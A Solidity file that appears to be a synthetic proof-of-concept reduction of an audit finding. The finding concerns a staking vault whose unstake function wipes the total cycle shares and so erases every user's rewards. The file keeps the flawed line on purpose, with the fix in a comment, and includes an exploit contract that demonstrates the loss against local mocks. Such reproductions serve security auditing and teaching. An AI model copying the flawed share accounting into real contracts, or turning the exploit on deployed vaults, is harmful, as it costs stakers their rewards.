// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Surge — Unstake causes all users to lose their rewards
    (Shieldify Security, finding #55142)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: StakingVault._unstake() assigns `shares` from the TOTAL
    `_rewardPoolShares[poolId][cycleId]` and subtracts that entire value from
    the same slot, zeroing pool shares for the cycle instead of decrementing
    by the unstaking user's personal share amount. After any unstake,
    claimRewardsToOwed() divides by zero / uses 0 total shares and all users
    lose reward accrual.

    Vulnerable line preserved with @> VULN marker.
    FIX: `uint256 shares = _userShares[user][poolId];` before subtracting. */

contract MockStakingToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced StakingVault with the buggy _unstake share accounting.
contract StakingVault {
    MockStakingToken public immutable stakingToken;
    // poolId => cycleId => total shares in the reward pool for that cycle
    mapping(uint256 => mapping(uint256 => uint256)) public rewardPoolShares;
    // user => poolId => personal shares
    mapping(address => mapping(uint256 => uint256)) public userShares;
    // user => poolId => cycle they staked into
    mapping(address => mapping(uint256 => uint256)) public userCycle;
    // user staked principal
    mapping(address => uint256) public stakedAmount;
    // accumulated reward units available for a cycle (injected by admin)
    mapping(uint256 => mapping(uint256 => uint256)) public cycleRewardUnits;
    // user owed rewards
    mapping(address => uint256) public owedRewards;

    uint256 public constant POOL_ID = 1;
    uint256 public currentCycle = 1;

    constructor(MockStakingToken t) {
        stakingToken = t;
    }

    function totalShares(uint256 poolId, uint256 cycleId) external view returns (uint256) {
        return rewardPoolShares[poolId][cycleId];
    }

    function stake(address user, uint256 amount) external {
        stakingToken.transferFrom(user, address(this), amount);
        userShares[user][POOL_ID] += amount;
        stakedAmount[user] += amount;
        userCycle[user][POOL_ID] = currentCycle;
        rewardPoolShares[POOL_ID][currentCycle] += amount;
    }

    function injectRewards(uint256 cycleId, uint256 units) external {
        cycleRewardUnits[POOL_ID][cycleId] += units;
    }

    function advanceCycle() external {
        currentCycle += 1;
    }

    /// @dev claimRewardsToOwed uses total pool shares as the divisor.
    function claimRewardsToOwed(address user) external returns (uint256 reward) {
        uint256 cycleId = userCycle[user][POOL_ID];
        uint256 total = rewardPoolShares[POOL_ID][cycleId];
        uint256 personal = userShares[user][POOL_ID];
        uint256 units = cycleRewardUnits[POOL_ID][cycleId];
        if (total == 0 || personal == 0) {
            // After a buggy unstake, total is 0 → everyone gets 0 forever.
            reward = 0;
        } else {
            reward = (units * personal) / total;
        }
        owedRewards[user] += reward;
        // consume so double-claim is 0 (units stay for simplicity of demo)
    }

    function unstake(address user) external {
        _unstake(user);
    }

    /// @dev Vulnerable _unstake (StakingVault.sol): subtracts TOTAL pool shares.
    function _unstake(address user) internal {
        uint256 poolId = POOL_ID;
        uint256 cycleId = userCycle[user][poolId];
        uint256 personal = userShares[user][poolId];
        require(personal > 0, "nothing staked");

        // BUG: reads TOTAL pool shares, not the user's personal amount.
        uint256 shares = rewardPoolShares[poolId][cycleId]; // @> VULN: total pool shares, not user shares
        // FIX: uint256 shares = userShares[user][poolId];
        rewardPoolShares[poolId][cycleId] -= shares; // zeroes the entire cycle

        uint256 principal = stakedAmount[user];
        stakedAmount[user] = 0;
        userShares[user][poolId] = 0;
        stakingToken.transfer(user, principal);
    }
}

contract Actor {
    function approveAndStake(StakingVault vault, MockStakingToken tok, uint256 amount) external {
        tok.approve(address(vault), amount);
        vault.stake(address(this), amount);
    }

    function unstake(StakingVault vault) external {
        vault.unstake(address(this));
    }
}

contract Exploit {
    MockStakingToken public stakingToken; // CREATE nonce 1
    StakingVault public vault; // CREATE nonce 2 — vulnerable
    Actor public user; // CREATE nonce 3 — long-term staker who should earn rewards
    Actor public attacker; // CREATE nonce 4 — unstakes and zeros everyone's shares

    uint256 public sharesBeforeUnstake;
    uint256 public sharesAfterUnstake;
    uint256 public userRewardAfter;

    constructor() {
        stakingToken = new MockStakingToken();
        vault = new StakingVault(stakingToken);
        user = new Actor();
        attacker = new Actor();
    }

    function run() external {
        // Both stake 1000 into cycle 1.
        stakingToken.mint(address(user), 1000);
        stakingToken.mint(address(attacker), 1000);
        user.approveAndStake(vault, stakingToken, 1000);
        attacker.approveAndStake(vault, stakingToken, 1000);

        sharesBeforeUnstake = vault.totalShares(1, 1);
        require(sharesBeforeUnstake == 2000, "both staked");

        // Inject rewards that both should share 50/50 (1000 units each).
        vault.injectRewards(1, 2000);

        // Attacker unstakes — buggy code zeros ALL pool shares for the cycle.
        attacker.unstake(vault);

        sharesAfterUnstake = vault.totalShares(1, 1);
        require(sharesAfterUnstake == 0, "pool shares should be zeroed");

        // Honest user tries to claim — divisor is 0 → reward = 0.
        vault.claimRewardsToOwed(address(user));
        userRewardAfter = vault.owedRewards(address(user));

        // HARM: user's fair share of 1000 reward units is wiped; owed stays 0.
        require(userRewardAfter == 0, "harm not demonstrated: user should have lost rewards");
        // user still has shares on the books but the pool total is gone
        require(vault.userShares(address(user), 1) == 1000, "user personal shares remain");
        require(vault.stakedAmount(address(attacker)) == 0, "attacker unstaked");
    }
}
